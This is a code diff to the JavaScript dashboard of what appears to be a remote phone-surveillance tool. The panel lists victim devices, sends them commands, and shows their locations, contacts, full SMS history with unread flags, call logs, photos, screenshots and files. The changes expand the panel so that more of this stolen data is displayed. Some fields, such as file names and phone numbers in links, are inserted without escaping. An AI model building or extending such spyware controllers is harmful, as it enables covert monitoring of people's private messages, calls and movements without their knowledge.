@@ -33,7 +33,6 @@ function showDashboard() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('dashboard').classList.remove('hidden');
   loadData();
-  // 60 second auto-refresh (dropdown reset nahi hoga)
   setInterval(loadData, 60000);
 
   socket = io();
@@ -43,7 +42,6 @@ function showDashboard() {
    'bluetooth-update'].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
 }
 
-// ⚠️ Save selections + restore
 function loadData() {
   const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
@@ -55,7 +53,6 @@ function loadData() {
       renderStats(data.stats || {});
       renderTab(currentTab);
 
-      // Restore dropdown selections
       setTimeout(() => {
         const devSel = document.getElementById('cmdDevice');
         const cmdSel = document.getElementById('cmdType');
@@ -85,7 +82,7 @@ function renderStats(s) {
     <div class="stat-card"><div class="stat-value">${s.totalScreenshots||0}</div><div class="stat-label">Screenshots</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalContacts||0}</div><div class="stat-label">Contacts</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalMessages||0}</div><div class="stat-label">SMS</div></div>
-    <div class="stat-card"><div class="stat-value">${s.totalBluetooth||0}</div><div class="stat-label">Bluetooth</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalCallLogs||s.totalCalls||0}</div><div class="stat-label">Calls</div></div>
   `;
 }
 
@@ -196,7 +193,6 @@ function quickLive(deviceId) {
   }, 200);
 }
 
-// ============ LIVE ============
 function renderLive() {
   const list = Object.values(allData.devices || {});
   return `
@@ -220,9 +216,9 @@ function renderLive() {
   `;
 }
 
-// ============ RENDERERS ============
+// ============ LOCATIONS ============
 function renderLocations() {
-  const list = (allData.locations || []).slice().reverse().slice(0, 100);
+  const list = (allData.locations || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi location nahi</div>';
   return list.map(l => `
     <div class="item-card">
@@ -236,47 +232,62 @@ function renderLocations() {
   `).join('');
 }
 
+// ============ CONTACTS - WITH NUMBER AND TYPE ============
 function renderContacts() {
   const list = allData.contacts || [];
   if (!list.length) return '<div class="loading">Koi contact nahi</div>';
   return list.map(c => `
     <div class="item-card">
       <div>
-        <div class="device-name">👤 ${esc(c.name)}</div>
-        <div class="device-id">📞 ${c.phone}</div>
+        <div class="device-name">👤 ${esc(c.name || 'Unknown')}</div>
+        <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.phone || 'No number')}</div>
+        ${c.type ? `<div class="device-id">📱 ${c.type}</div>` : ''}
       </div>
-      <a href="tel:${c.phone}" class="btn-action">📞</a>
+      <div>
+        <a href="tel:${c.phone}" class="btn-action">📞</a>
+        <a href="sms:${c.phone}" class="btn-action">💬</a>
+      </div>
     </div>
   `).join('');
 }
 
+// ============ SMS - FULL HISTORY ============
 function renderMessages() {
-  const list = (allData.messages || []).slice().reverse().slice(0, 200);
+  const list = (allData.messages || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
-  return list.map(m => `
+  return list.map(m => {
+    const typeColor = m.type === 'sent' ? '#4ade80' : '#4f8cff';
+    const typeIcon = m.type === 'sent' ? '📤' : '📥';
+    return `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
-      <div class="device-name">💬 ${esc(m.from)}</div>
+      <div style="display:flex;justify-content:space-between;width:100%">
+        <div class="device-name" style="color:${typeColor}">${typeIcon} ${esc(m.from)}</div>
+        ${m.read === false ? '<span class="badge" style="background:#dc2626;color:#fff">UNREAD</span>' : ''}
+      </div>
       <div style="color:#8b9ab5;margin:6px 0">${esc(m.body)}</div>
       <div class="device-id">${new Date(parseInt(m.time)||m.time).toLocaleString()}</div>
     </div>
-  `).join('');
+  `}).join('');
 }
 
+// ============ CALL LOGS ============
 function renderCallLogs() {
-  const list = (allData.callLogs || []).slice(0, 200);
+  const list = (allData.callLogs || []).slice(0, 500);
   if (!list.length) return '<div class="loading">Koi call nahi</div>';
   const types = {1:'📥',2:'📤',3:'❌',4:'📮',5:'🚫',6:'⏱️'};
   return list.map(c => `
     <div class="item-card">
       <div>
-        <div class="device-name">${types[c.type]||'📞'} ${esc(c.name)}</div>
-        <div class="device-id">${c.number} | ⏱️ ${c.duration}s</div>
-        <div class="device-id">${new Date(parseInt(c.time)).toLocaleString()}</div>
+        <div class="device-name">${types[c.type]||'📞'} ${esc(c.name || 'Unknown')}</div>
+        <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.number)}</div>
+        <div class="device-id">⏱️ ${c.duration}s | ${new Date(parseInt(c.time)).toLocaleString()}</div>
       </div>
+      <a href="tel:${c.number}" class="btn-action">📞</a>
     </div>
   `).join('');
 }
 
+// ============ PHOTOS ============
 function renderPhotos() {
   const list = (allData.photos || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi photo nahi</div>';
@@ -324,7 +335,7 @@ function renderFiles() {
     <div class="item-card">
       <div>
         <div class="device-name">📄 ${f.originalName}</div>
-        <div class="device-id">${(f.size/1024).toFixed(1)} KB</div>
+        <div class="device-id">${(f.size/1024).toFixed(1)} KB | ${new Date(f.time).toLocaleString()}</div>
       </div>
       <a href="${f.url}" target="_blank" class="btn-action">⬇️</a>
     </div>
@@ -387,7 +398,7 @@ function renderInfo() {
 }
 
 function renderCommands() {
-  const list = (allData.commands || []).slice().reverse().slice(0, 100);
+  const list = (allData.commands || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi command nahi</div>';
   return list.map(c => `
     <div class="item-card">
@@ -408,7 +419,6 @@ function sendCommand() {
   const command = document.getElementById('cmdType').value;
   if (!deviceId) return alert('Device select karein');
 
-  // Save selection permanently
   localStorage.setItem('csk4_dev', deviceId);
   localStorage.setItem('csk4_cmd', command);
 
